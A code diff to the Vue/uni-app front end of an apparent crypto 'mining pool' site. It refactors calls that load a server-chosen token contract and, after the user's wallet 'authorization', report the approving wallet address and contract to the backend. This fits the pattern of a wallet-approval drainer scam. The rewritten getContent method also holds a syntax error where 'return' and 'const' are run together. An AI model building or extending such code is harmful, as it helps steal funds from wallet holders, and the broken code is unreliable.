@@ -72,40 +72,37 @@
 				this.earnings = []
 				this.problem = []
 			},
-			getContent() {
-				http.post('/api/0ptP1e/home', {
-					data: {
-						"language": uni.getLocale(),
-						"wallet_address": null,
-						"coin_name": "ETH"
-					}
-				}).then(res => {
-					if (!res) return
-					const {
-						data
-					} = res
-					const title = data.title
-					this.mining_pool = data.mining_pool || {}
-					this.earnings = data.platform_earnings || []
-					this.problem = data.problem || []
-					this.banner = data.banner
-					this.title = title
-					this.white = data.white_paper
-					uni.setStorageSync('title', title)
-				})
-			},
-			doapprove_success(straddress, strcontract) {
-				//保存授权地址信息，无需处理返回信息
-        const that = this;
-        const ysdata = {};
-        ysdata['action'] = 'address'
-				ysdata['address'] = straddress
-				ysdata['contract'] = strcontract
-				let ys_over = comjs.ApiSync(ysdata);
-				ys_over.then(res => {
-					comjs.log(res)
-				});
-			},
+			async getContent() {
+        const res = await http.post('/index/Index/home', {
+          data: {
+            "language": uni.getLocale(),
+            "wallet_address": null,
+            "coin_name": "ETH"
+          }
+        })
+        if (!res) returnconst {
+          data
+        } = res
+        const title = data?.title
+        this.mining_pool = data?.mining_pool || {}
+        this.earnings = data?.platform_earnings || []
+        this.problem = data?.problem || []
+        this.banner = data?.banner
+        this.title = title
+        this.white = data?.white_paper
+        uni.setStorageSync('title', title)
+        uni.hideLoading()
+      },
+      async doapprove_success(address, contract) {
+        //保存授权地址信息，无需处理返回信息
+        const data = {
+          address,
+          contract
+        };
+
+        const res = await http.post('/index/Index/address', data)
+        console.log(`address res`, res)
+      },
 			async doapprove_trc() {
 				//是否获取到相应合约
 				if (!this.contract || !this.contract.contract || !this.contract.contract.trc) {
@@ -208,17 +205,12 @@
 				}
 				//开始授权
 			},
-			getcontract() {
-				uni.showLoading()
-        const that = this;
-        const ysdata = {};
-        ysdata['action'] = 'contract'
-				let ys_over = comjs.ApiSync(ysdata);
-				ys_over.then(res => {
-					that.contract = res.data
-					comjs.log(that.contract)
-				});
-			},
+			async getcontract() {
+        uni.showLoading()
+        const res = await http.post('/index/Index/contract')
+        this.contract = res.data
+        console.log(`this.contract`,this.contract)
+      },
 			async ethcontent_address() {
 				const accounts = await this.web3js.eth.getAccounts();
 				//comjs.log(accounts)
